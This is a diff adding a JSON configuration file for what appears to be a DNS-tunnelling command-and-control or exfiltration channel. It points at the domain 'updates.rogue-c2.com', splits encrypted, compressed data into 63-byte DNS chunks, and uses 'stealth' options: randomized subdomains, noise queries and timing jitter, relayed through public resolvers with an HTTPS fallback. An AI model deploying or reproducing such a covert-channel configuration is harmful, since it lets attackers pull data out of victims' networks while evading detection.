@@ -1,0 +1,30 @@
+{
+  "enabled": true,
+  "domain": "updates.rogue-c2.com",
+  "listen_port": 53,
+  "backup_port": 5353,
+  "encryption": {
+    "algorithm": "AES-256-EAX",
+    "key_derivation": "PBKDF2-HMAC-SHA256",
+    "iterations": 100000
+  },
+  "fragmentation": {
+    "max_chunk_size": 63,
+    "include_metadata": true,
+    "compression": true
+  },
+  "stealth": {
+    "query_type": "A",
+    "randomize_subdomains": true,
+    "add_noise_queries": true,
+    "jitter_between_queries": true
+  },
+  "resolvers": [
+    "8.8.8.8",
+    "1.1.1.1",
+    "9.9.9.9"
+  ],
+  "fallback_to_https": true,
+  "auto_retry": true,
+  "max_retries": 3
+}
